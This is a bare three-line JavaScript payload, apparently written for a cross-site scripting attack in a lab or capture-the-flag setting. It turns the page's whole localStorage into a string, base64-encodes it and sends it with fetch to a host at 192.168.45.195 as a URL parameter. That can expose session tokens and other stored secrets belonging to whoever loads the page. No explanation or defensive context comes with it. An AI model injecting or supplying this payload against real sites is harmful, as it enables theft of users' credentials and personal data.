let data = JSON.stringify(localStorage)

let encodedData = btoa(data)

fetch("http://192.168.45.195/local_data?data=" + encodedData)
